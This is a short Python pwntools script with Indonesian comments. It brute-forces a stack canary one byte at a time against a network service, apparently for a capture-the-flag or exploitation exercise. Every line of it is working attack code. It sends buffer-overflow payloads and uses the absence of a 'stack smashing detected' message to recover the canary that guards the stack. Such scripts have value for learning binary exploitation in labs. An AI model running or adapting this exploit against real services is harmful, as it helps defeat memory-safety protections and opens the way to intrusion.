from pwn import *

# Konfigurasi target
host = '127.0.0.1' # Ganti dengan IP target
port = 1337        # Ganti dengan Port target

# Kita mulai dengan byte pertama yang sudah pasti \x00
known_canary = b'\x00'

# Buffer ke arah canary (sesuaikan dengan hasil cyclic kamu)
offset = 32 

log.info("Memulai Brute Force Canary byte-by-byte...")

# Kita perlu mencari 3 byte sisanya (untuk arsitektur 32-bit)
# Jika 64-bit, ganti range(3) menjadi range(7)
for i in range(3):
    for b in range(256):
        try:
            # Hubungkan ke server di setiap percobaan
            p = remote(host, port, level='error')
            
            # Susun payload: Buffer + Canary yang sudah tahu + Byte tebakan
            test_byte = bytes([b])
            payload = b'A' * offset + known_canary + test_byte
            
            p.sendafter(b'Input: ', payload)
            
            # Tunggu respon. Jika tidak ada "stack smashing detected" atau program masih hidup
            # Berarti tebakan kita benar.
            response = p.recvall(timeout=0.5)
            
            if b"stack smashing detected" not in response:
                known_canary += test_byte
                log.success(f"Ketemu byte ke-{len(known_canary)}: {hex(b)}")
                p.close()
                break # Berhenti di byte ini, lanjut ke byte berikutnya
                
            p.close()
            
        except EOFError:
            # Jika koneksi putus tiba-tiba, berarti canary salah (crash)
            pass

log.success(f"Final Canary: {known_canary.hex()}")